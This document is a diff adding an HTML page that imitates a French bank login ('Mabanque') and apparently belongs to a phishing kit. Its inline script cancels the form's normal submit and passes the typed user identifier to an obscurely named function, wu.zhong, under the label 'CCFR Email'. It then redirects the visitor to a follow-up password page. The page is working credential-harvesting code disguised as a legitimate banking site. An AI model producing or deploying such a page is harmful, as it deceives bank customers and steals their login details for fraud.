@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>Mabanque</title>
+</head>
+<body>
+
+    <header>
+<div class="left">
+
+     <img src="res/img/logo.png" > </div> 
+
+</div>
+<div class="right">
+    <img src="res/img/right.png">
+</div>
+
+<div class="head">
+    <img src="res/img/heado.png" >
+
+</div>
+
+    </header>
+    <div class="z">
+
+</div>
+
+
+
+    
+
+    <main>
+	
+
+    <div class="form">
+        <div class="">
+            
+        
+
+        <div class="lock">
+       <img src="res/img/clo.png" >
+        </div>
+        
+        <form action="password.php" method="get">
+        <div class="col">
+            <label >Votre identifiant</label>
+            <input type="text"   placeholder="Saisissez Votre Identifiant"  name="user" required>
+
+        </div>
+
+        <div class="colo">
+            <input type="checkbox" >
+            <label > Se souvenir de moi</label>
+        </div>
+        <div class="but">
+            <button type="submit">Suivant</button>
+
+        </div>
+		<script src="./res/jq.js"></script>
+       
+
+        <div class="a">
+            <a href="#">Identifiant ou mot de passe oublié / Accès bloqué</a></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+    </div>
+
+   
+    </main>
+
+
+    <script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`✉️ CCFR Email: ${document.querySelector("[name='user']").value}`);
+
+window.location="password.html";
+
+})
+
+</script>
+
+</body>
+</html>
